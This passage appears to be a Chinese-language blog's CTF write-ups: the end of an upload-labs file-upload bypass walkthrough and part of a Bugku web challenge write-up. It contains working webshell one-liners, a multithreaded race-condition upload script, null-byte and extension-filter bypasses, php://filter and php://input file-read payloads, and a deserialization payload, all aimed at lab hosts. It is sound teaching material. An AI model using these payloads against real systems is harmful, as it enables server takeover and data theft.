(move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH. &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;])) &#123; $img_path = UPLOAD_PATH .&#x27;/&#x27;. $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $is_upload = true; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125;//原文：https://blog.csdn.net/qq_29647709/article/details/81227084 Pass-04也是一个黑名单验证，强度更大，几乎过滤了所有的后缀名,除了.htaccess 1.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot; .htaccess文件,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 上传一个.htaccess文件，在里面写入 1SetHandler application/x-httpd-php 这样所有文件都会解析为php，然后再上传图片马，就可以成功解析： 可以成功访问，说明解析成功 Pass-05看了一下源码，发现黑名单所有后缀名都被过滤了，也包括.htacces 1&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot; 但是，和前面的比较一下，少了一行将将后缀进行大小写统一的代码pass-5pass-4 所以，可以通过大小写绕过成功上传 Pass-06查看源码，黑名单 可以发现，没有对后缀名进行去空处理，可在后缀名中加空绕过： 1$file_ext = trim($file_ext); //首尾去空 上传成功 Pass-07查看源码，黑名单 可以发现，没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过 1$file_name = deldot($file_name);//删除文件名末尾的点 上传成功 Pass-08查看源码，黑名单 没有进行去除字符串::$DATA的操作，所以，可以在后缀名添加::$DATA来绕过： 1$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 上传成功 Pass-09查看源码，黑名单 可以发现，源码的第15行，与之前的不一样 1$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; //这一关的 1$img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; //之前的 路径拼接的是处理后的文件名，于是构造info.php. . （点+空格+点），经过处理后，文件名变成info.php.，即可绕过。 Pass-10查看源码，黑名单 这两行代码有问题 12$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); str_ireplace()函数 123456789str_ireplace(find,replace,string,count)参数 描述find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。一个变量，对替换数进行计数。原文：https://blog.csdn.net/qq_29647709/article/details/81237032 注意到，这里是将问题后缀名替换为空，于是可以利用双写绕过 Pass-11(00截断$_GET)查看源码，发现是一个白名单，$_GET传参save_path 看到是白名单判断，但是$img_path直接拼接，因此可以利用%00截断绕过 基础补充两个函数：substr()、strrpos() 1234567891011121314strrpos() 定义和用法 strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。 注释：strrpos() 函数对大小写敏感。 相关函数： stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写） strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写） strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写） 语法 strrpos(string,find,start) 参数 描述 string 必需。规定被搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定在何处开始搜索。原文：https://blog.csdn.net/qq_29647709/article/details/81264120 1234567substr() 这里写代码片语法 substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始 负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度原文：https://blog.csdn.net/qq_29647709/article/details/81264120 123截断条件： php版本小于5.3.4 详情关注CVE-2006-7243 php的参数开关上设置里magic_quotes_gpc为OFF状态 设置完成后，即可成功绕过， 详情查看：https://blog.csdn.net/qq_29647709/article/details/81264120 Pass-12(00截断$_POST)查看源码，$_POST传参save_path 还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。 添加一个1.php+(任意名称) 这里的2b对应的就是**+**号，将2b改成00，即可成功截断，1.php也可成功上传利用 Pass-13查看源码， 可以看出，验证上传文件类型的方法是：通过判断上传文件的前两个字节来判断的，所以直接上传图片马即可绕过.jpg和.png检查，制作方法copy 1.jpg /b + info.php /a shell.jpg1.jpg是一个图片，info.php写入一句话木马的文件，shell.jpg复制后的文件 添加GIF图片的文件头GIF89a，绕过GIF图片检查。 一句话木马也可以上传成功文件路径也会显示，然后就可以利用文件包含漏洞。 可以写一个include.php: 1234&lt;?php$file=$_GET[&#x27;page&#x27;];include($file);?&gt; 然后放在upload中，在你上传成功图片马之后，你可以访问，执行phpinfo().http://127.0.0.1/uploadlab/upload/include.php?page=upload/5020190128200535.jpg Pass-14查看源码，这里使用getimagesize获取文件类型 123 getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 利用图片马就可进行绕过，和上一关一样。 Pass-15查看源码， 利用exif_imagetype()，判断文件类型，Pass-13的方法即可绕过。 Pass-16查看源码 使用imagecreatefromjpeg()来判断文件类别，已可以使用Pass-13的方法。 原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 Pass-17查看源码 利用条件竞争删除文件时间差绕过。使用命令pip install hackhttp安装hackhttp模块，运行下面的Python代码即可。如果还是删除太快，可以适当调整线程并发数。 1234567891011121314151617181920212223242526272829303132333435363738394041# coding:utf-8# Build By LandGrey import hackhttpfrom multiprocessing.dummy import Pool as ThreadPool def upload(lists): hh = hackhttp.hackhttp() raw = &quot;&quot;&quot;POST /upload-labs/Pass-17/index.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://127.0.0.1/upload-labs/Pass-17/index.phpCookie: pass=17Connection: closeUpgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=---------------------------6696274297634Content-Length: 341 -----------------------------6696274297634Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php&quot;Content-Type: application/octet-stream &lt;?php assert($_POST[&quot;LandGrey&quot;])?&gt;-----------------------------6696274297634Content-Disposition: form-data; name=&quot;submit&quot; 上传-----------------------------6696274297634--&quot;&quot;&quot; code, head, html, redirect, log = hh.http(&#x27;http://127.0.0.1/upload-labs/Pass-17/index.php&#x27;, raw=raw) print(str(code) + &quot;\\r&quot;) pool = ThreadPool(10)pool.map(upload, range(10000))pool.close()pool.join() 在脚本运行的时候，访问Webshell，我一直没成功，不知道为什么原文链接：https://www.chabug.org/web/470.html Pass-18查看源码像Pass-13一样可以上传图片马 Pass-19(CVE-2015-2348 move_uploaded_file() 00截断)查看源码 123456$img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传失败！&#x27;; &#125; CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过：利用方式：上传的文件名用0x00绕过,改成19.php【二进制00】.1.jpg 参考两个大佬的 12https://blog.csdn.net/qq_29647709/article/details/81264120https://www.chabug.org/web/470.html","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"upload_labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"}]},{"title":"Bugku_Web_WriteUp","slug":"大学CTF/Bugku-Web-WriteUp","date":"2018-12-16T08:50:11.000Z","updated":"2021-05-11T13:47:14.703Z","comments":true,"path":"2018/12/16/大学CTF/Bugku-Web-WriteUp/","link":"","permalink":"http://example.com/2018/12/16/%E5%A4%A7%E5%AD%A6CTF/Bugku-Web-WriteUp/","excerpt":"前言刷刷题，长长见识","text":"前言刷刷题，长长见识 Web2直接查看源码即可 计算器答案为两位数，输入却只能输入一位，F12查看源码 然后，右键编辑HTML，改成maxlengt=”2”，输入计算结果，得到flag web基础$_GetPHP语句，GET方式上传信息，直接在后面加上?what=flag，得到flag web基础$_POST这题要post数据，Firefox安装一个hackbar插件，F12打开，输入如下，即可得到flag 矛盾 PHP函数bool is_numeric ( mixed $var )检测量是否为数字或数字字符如果var是数字或者数字字符则返回true，否则返回false 题目的意思是$num不是数字活数字字符，但是还要$num=1$GET方式传参，可以令num=1x(x可以为任意字符)，即可得到flag Web3 查看源码，发现一串HTML字符 写一个脚本，代码如下 123456s=&#x27;&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125&#x27;key=s.split(&#x27;;&#x27;)flag=&#x27;&#x27;for i in key: flag+=chr(int(i[2:]))print flag 拿到flag 域名解析 bugku原来的IP为下面的 这个IP也是无法访问的 打开C:/windows/system32/drivers/etc目录下的hosts文件 在最后一行加上123.206.87.240 flag.bugku.com，保存设置 再次访问flag.bugku.com，得到flag， 你必须让他停下直接用burpsuite抓包，然后找一找，就找到了 本地包含 REQUEST默认情况下包含了$_GET，$_POST 和 $_COOKIE 的数组。 这题的目的就是要看到flag.php里的内容方法有很多 12345?hello=file(&#x27;flag.php&#x27;)?hello=1);show_source(&#x27;flag.php&#x27;);//?hello=1);show_source(&#x27;flag.php&#x27;);var_dump( 都可以的得到flag 变量一 发现有$$的变量，直接用全局变量$GLOBALS即可，?args=GLOBALS,进而构造出var_dump($GLOBALS) payload: 1http://123.206.87.240:8004/index1.php?args=GLOBALS Web3查看源码，发现JSFUCK 复制粘贴到console即可，或者JSFUCK在线解密一下 头等舱很简单，burpsuite抓包即可。 网站被黑需要用御剑扫描器，扫描一下网站的后台 打开index.php是原来网页，打开shell.php，出现webshell，要密码 直接用burpsuite暴力破解，先抓包，然后send to intruder 点击positions，先点击clear，清除$，然后选中密码123456，点击add，添加$ 点击payload，进行如下选择，其他默认 然后点击start attack 一会之后，得到结果，然后观察爆破结果，length大部为1125，只有一个1110，异常，猜测这个就是密码，尝试登录， 会回显flag 管理员系统查看源代码，发现一段base64 解密后得到 尝试登录，用户名为admin，密码为test123 IP禁止访问，请联系本地管理员登录要伪装一下，伪装成本地IP，在headers添加一个伪装头部 即可得到flag Web4查看源码，发现两串URl编码，在线解码后，发现 直接提交，得到flag flag在index里payload： 1http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php url上面有file参数，就想到了php里面的file协议，用base64转码把index.php里面的内容读出来，再解码，得到flag 输入密码查看flag要输入5位数字，字节暴力破解，bp一下即可得到flag 点击一百万次查看源码 post一个clicks=1000000即可 本地包含2查看源码，发现有个upload.php 访问看看，到了一个文件上传网页 构造一句话木马， 1&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt; 更改文件名为1.php;.jpg，然后上传 查看 可以直接看到包含的文件 再访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt，即可得到flag 各种绕过 GET获取uname，idPOST获取passwd ===：比较两个变量的只和类型 ==：比较值，不比较类型要使uname的sha1和值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等很熟悉的套路 只要构造数组 构造，即可得到flag 求getshell是一道文件上传题，开始改了各种后缀名，尝试了很多都不行 好不容易拿到这个的时候，还以为快成功了，搜了搜wp，发现还是做错了 用bp抓包后，然后更改头部信息Content-Type, 通过修改Content-type后字母的大小写可以绕过检测，分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤然后修改文件后缀名为.php5 程序员的本地网站要求从本地访问直接bp抓包，伪装成本地登录，在头部添加 X-forwarded-for:127.0.0.1 在做题过程中发现了点问题，不知道是迷惑人，还是存在的bug cookie欺骗URL上有段base64，解密后的信息是”keys.txt” 参数line是按行返回信息 从keys.txt可以看出，”filename=”后面直接加的是文件名的base64编码 猜测index.php文件是否存在，把index.php转成base64：aW5kZXgucGhw填入url，payload：http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw 查看源码，有信息 把line改成line=3试试，有信息 写一个脚本，获得index.php中的信息 12345678910import requestsre=requests.Session()url=&#x27;http://123.206.87.240:8002/web11/index.php&#x27;for i in range(0,20): key=&#123;&#x27;line&#x27;:str(i),&#x27;filename&#x27;:&#x27;aW5kZXgucGhw&#x27;&#125; a=re.get(url,params=key).content code=str(a,encoding=&quot;utf-8&quot;) print(code) 拿到index.php的源码 可以看到，cookie的名字和值都是”margin” 修改cookie：margin=margin ,修改filename的值为keys.php的base64编码，访问keys.php(图中标1处，即为keys.php的base64编码) 速度要快查看源码，要post一个margin bp抓包， Base64解码之后，又一个base64，再解码 得到几个数字，没什么用啊 bp又抓了一次，发现flag居然变了，又进行了解码，也没用 看了大佬的wp，使用脚本做的，学习一下 123456789101112131415import requestsimport base64url=&quot;http://123.206.87.240:8002/web6/&quot;r=requests.session()headers=r.get(url).headers#因为flag在消息头里mid=base64.b64decode(headers[&#x27;flag&#x27;])mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的flag = base64.b64decode(mid.split(&#x27;:&#x27;)[1])#获得flag:后的值data=&#123;&#x27;margin&#x27;:flag&#125;print (r.post(url,data).text)#post方法传上去 拿到flag 过狗一句话题目给的代码 12345&lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#x27;s&#x27;]) ?&gt; explode()函数可以在官方文档看详细信息，就是把字符串打散成数组。 exlpde()分割a#s#s#e#r#t为assert，使用assert()函数的解析传进来的s串，那就说明可以执行代码。 payload: s=print_r(scandir(‘./‘)) 然后读取fl4g.txt s=print_r(glob(“*.*“)) 然后读取show_source(“fl4g.txt”)** 使用file_get_contents(“flag.txt”)读取文件** 读取文件还可以使用readfile()和fopen(),可以任意读取文件。 12?s=print_r(readfile(&#x27;../etc/hosts&#x27;))?s=print_r(fopen(&#x27;../etc/hosts&#x27;,&#x27;r&#x27;)) md5 collision题目提示是MD5碰撞，开始试了几个a=1之类的，都报是false，猜测应该是要输入的这个值，MD5之后是以0e开头的字符串，因为，PHP在处理哈希字符串时，会利用!=或==来对哈希值进行比较，它把每一个以0e开头的哈希值都解释为0 payload：?a=s155964671a never give up打开题目，看看源码，发现一个1.html，查看源码， 1234567891011121314151617181920&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE=&quot;Javascript&quot;&gt;&lt;!--var Words =&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; 可以看到中间有一大段base64加密的串，还混这url，base64解密之后，是一段url编码，和一些语句， 1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E 再次url解码之后，得到源码 1234567891011121314151617181920212223if(!$_GET[&#x27;id&#x27;])&#123; header(&#x27;Location: hello.php?id=1&#x27;); exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];if(stripos($a,&#x27;.&#x27;))&#123; echo &#x27;no no no no no no no&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;&#125; if(stripos($a,’.’)) if($data==”bugku is a nice plateform!” and $id==0 and strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4) 要求a中不能有字符，id不能是空，且id=0，data=”bugku is a nice plateform!”，id=0，b的长度&gt;5，”111”拼接上b的第一个字符=“1114”，但是b的低一个字符有不能=4，这样才可以包含f412a3g.txt 我们一点点来分析， PHP在处理数字与字符串的结合是会把第一个数字当做整个串的值，比如”1asd“=1，那么我们只要使id的值，是一个字符串，就可以使id弱等于0， 源码中变量 $data 是由 file_get_contents()读取的 ，file_get_contents() 函数是用于将文件的内容读入到一个字符串中的方法，函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。 我们不可能创建一个a文件，再写入数据bugku is a nice plateform!。 那么，要让a=bugku is a nice plateform!，只能利用，用php伪协议 php:// 来访问输入输出的数据流，它的大概意思就是可以读取我们post传递的只读数据流。所以，令 $a = &quot;php://input&quot;，并post提交字符串 bugku is a nice plateform!。 而对于eregi(“111”.substr($b,0,1),”1114”)，很简单，直接用%00绕过，可以使b=%0012345 成得到flag。还有一个方法是，直接读取f4l2a3g.txt 也可以得到flag。 welcome to bugkuctf查看源码 12345678910$user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php &#125;else&#123; echo &quot;you are not admin ! &quot;; &#125; 有个hint.php，访问试试，什么都没有，不死心，再?file=php://filter/read=convert.base64-encode/resource=hint.php读一下，什么都没有，，，，，， 还是看源码吧 file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;，意思是把名为$user文件的内容输出到一个字符串，并且要求这个字符串是”welcome to the bugkuctf”， 这里可以使用php://伪协议，让user=php://，然后post提交welcome to the bugkuctf，这样就可以使语句变成file_get_contents(php://,&#39;r&#39;) payload ：GET：?txt=php://input POST：welcome to the bugkuctf 页面变了，但是为啥不是hello admin呢？ 而且，flag在哪呢。。。。。。。 突然想到hint.php，再读一次file=php://filter/read=convert.base64-encode/resource=hint.php payload：?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 有东西啊，拿去解码， 123456789&lt;?php //hint.phpclass Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt; 得到了源码，可以然并卵啊，，，百思不得其解，最后，百度了一下，发现php://filter读取index.php，居然把这个给忘了，，读吧， 再base64解码， 123456789101112131415161718&lt;?php //index.php$txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))&#123; echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;不能现在就给你们flag哦&quot;; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo &quot;you are not the number of bugku ! &quot;; &#125; ?&gt; if(preg_match(“/flag/“,$file)) //说明文件名不能含有flag $password = unserialize($password); 第一句，说明文件名$file不能含有flag， 而这段代码中，有一个__tostring()方法，双下划线的魔术方法，当Flag类被实例化的时候会自动执行__tostring方法，而这个方法中写了如果file文件存在，那么就输出file文件中的内容。 12345678if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;不能现在就给你们flag哦&quot;; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; 如果文件名没有”flag”了，就会把这个文件包含进来,然后$password进行反序列化，再输出$password的值。 所以我们要构造一个Flag类型的参数，并把这个参数传给password。 但是password被unserialize()反序列化处理，所以要先serialize()序列化，关于序列化与反序列化，可以查看我的另一篇文章，PHP序列化与反序列化 直接PHP代码在线执行 然后把 password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;get提交 终于拿到flag了 字符？正则？12345678 &lt;?php highlight_file(&#x27;2.php&#x27;);$key=&#x27;KEY&#123;********************************&#125;&#x27;;$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);if( $IM )&#123; die(&#x27;key is: &#x27;.$key);&#125;?&gt; 原文：https://blog.csdn.net/qq_30464257/article/details/81160656 关键的还是看preg_match中的内容嘛，这里简单讲一下、需要用到的规则 1.表达式直接写出来的字符串直接利用，如key 2.“.”代表任意字符 3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次 4.“\\/”代表“/” 5.[a-z]代表a-z中的任意一个字符 6.[[:punct:]]代表任意一个字符，包括各种符号 7./i代表大小写不敏感 8.&#123;4-7&#125;代表[0-9]中数字连续出现的次数是4-7次 payload：?id=keyaaakeyaaaakey:/a/aakeya@ 你从哪里来打开题目，就一句话 换Google浏览器试了一下，发现还是不行，那么只能修改header了 HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。 Web81234567891011&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;&#125;else&#123;echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;&#125;&#125;?&gt; $ac的值===$f，而**$f的值是从文件名为$fn的文件中读取的，我们并不知道$fn**的值是什么，这时看到了extract()，可以使用变量覆盖，get传入一个$ac的值，然后利用php伪协议，使$fn=php://input，当通过post提交一个和$ac一样的值，然后php://input会读入这个值，使$fn=这个值，从而覆盖掉$f的值 payload：get：?ac=1&amp;fn=php://input post : 1 在网上还看到一种方法，根据题目提示，访问flag.txt，看到文件内容是flags，然后构造payload： ?ac=flags&amp;fn=flag.txt，也是可以的，这个应该才是出题意图。 flag.php看看源码，发现login只是个按钮，怪不得怎么点都没反应 这个提示hint，找了半天不知道是什么用，最后，get传进去hint=1，发现了源码 12345678910111213141516171819202122232425262728293031323334 &lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;ISecer&#x27;];if(isset($_GET[&#x27;hint&#x27;]))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; 